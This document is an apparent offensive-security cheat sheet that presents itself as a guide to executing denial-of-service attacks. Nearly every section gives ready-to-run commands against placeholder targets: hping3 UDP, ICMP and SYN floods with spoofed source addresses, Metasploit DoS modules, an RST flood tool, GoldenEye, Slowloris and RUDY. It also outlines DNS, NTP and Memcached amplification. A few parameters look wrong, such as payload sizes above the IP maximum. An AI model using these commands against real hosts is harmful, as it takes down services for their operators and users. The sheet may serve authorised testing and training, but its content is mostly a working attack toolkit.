
> [!abstract] Denial of Service (DoS) & DDoS Attacks
> A comprehensive guide to executing Denial of Service attacks across different layers of the OSI model. This includes volumetric attacks, protocol exhaustion (State exhaustion), and Application Layer (Layer 7) attacks.
> **MITRE ATT&CK Mapping:** [T1498 Network Denial of Service](https://attack.mitre.org/techniques/T1498/)

## Volume-Based Attacks (Volumetric)

> [!danger]+ UDP & ICMP Floods
> These attacks aim to consume the target's bandwidth by overwhelming it with massive amounts of useless traffic.
> 
> **hping3 UDP Flood:**
> ```bash
> # Send a massive flood of UDP packets to a specific port
> hping3 -p 139 --udp --flood <TargetIP>
> 
> # UDP flood with random source IPs
> hping3 --udp --data 500 --rand-source --flood <TargetIP>
> ```
> 
> **hping3 ICMP Flood (Ping Flood):**
> ```bash
> # Send massive ICMP echo requests
> hping3 -1 --flood -d 65538 <TargetIP>
> ```
> 
> **MSFconsole ICMP Flood:**
> ```ruby
> use auxiliary/dos/tcp/imaxflood
> set RHOSTS <TargetIP>
> exploit
> ```

> [!warning] Amplification & Reflection Attacks (DDoS)
> Attackers spoof the victim's IP address and send small requests to public servers (like DNS or NTP). The servers send massive responses back to the victim, overwhelming them.
> - **DNS Amplification:** Spoofed DNS queries with `ANY` record requests.
> - **NTP Amplification:** Using the `monlist` command on vulnerable NTP servers.
> - **Memcached Amplification:** Spoofed requests to exposed Memcached servers (can amplify traffic by up to 51,000x).

---

## Protocol Attacks (Layer 3 & 4)

> [!bug]+ TCP SYN Flood
> Exploits the TCP handshake process by sending a flood of SYN packets without completing the handshake, exhausting the server's connection queue.
> 
> **MSFconsole SYN Flood:**
> ```ruby
> msf> use auxiliary/dos/tcp/synflood
> msf> set RHOST <TargetIP>
> msf> set RPORT <TargetPort>
> msf> set SHOST <IPtoSpoof> # Optional: Spoof source IP
> msf> exploit
> ```
> 
> **hping3 SYN Flood:**
> ```bash
> # SYN flood with spoofed IP
> hping3 -p 22 -S -a <IPtoSpoof> --flood <TargetIP>
> 
> # SYN flood with large payload to consume bandwidth
> hping3 -p 22 -d 65538 -S --flood <TargetIP>
> ```

> [!bug]+ TCP RST Flood (Connection Reset)
> Sends a flood of TCP RST (Reset) packets to forcefully drop active connections between a target and its clients.
> ```bash
> rst
> # Inside the RST interactive prompt:
> >> l4
> >> ip <targetip>
> >> port <target_port>
> >> threads 2000
> >> run
> ```

> [!info] Other Protocol Attacks
> - **Ping of Death (PoD):** Sending malformed or oversized ICMP packets to crash legacy systems. (`hping3 -1 -d 65535 <TargetIP>`)
> - **Smurf Attack:** ICMP requests sent to a network's broadcast address with the victim's spoofed IP.
> - **Fragmentation Attacks:** Sending overlapping or fragmented IP packets to crash the target's network stack.

## Application Layer Attacks (Layer 7)

> [!danger]+ HTTP GET / POST Floods
> Sends seemingly legitimate HTTP requests to a web server to exhaust its resource pools (CPU, RAM, Database connections). Unlike volumetric attacks, these require very little bandwidth.
> 
> **GoldenEye (HTTP DoS Tool):**
> ```bash
> # Basic HTTP flood
> goldeneye.py http://<TargetIP> -w 10 -s 100
> # -w: workers, -s: sockets per worker
> ```
> 
> **MSFconsole HTTP Flooder:**
> ```ruby
> use auxiliary/dos/http/get_boom
> set RHOSTS <TargetIP>
> set URI /
> exploit
> ```

> [!warning]+ Slowloris & Slow HTTP Attacks
> Instead of flooding with traffic, these attacks open many connections to the web server and keep them open as long as possible by sending partial HTTP requests periodically.
> 
> **Slowloris:**
> ```bash
> slowloris -p 80 <TargetIP>
> ```
> 
> **RUDY (R-U-Dead-Yet):**
> Targets web applications by submitting long, never-ending POST requests to exhaust server threads.
> ```bash
> ruby rudy.rb <TargetURL>
> ```

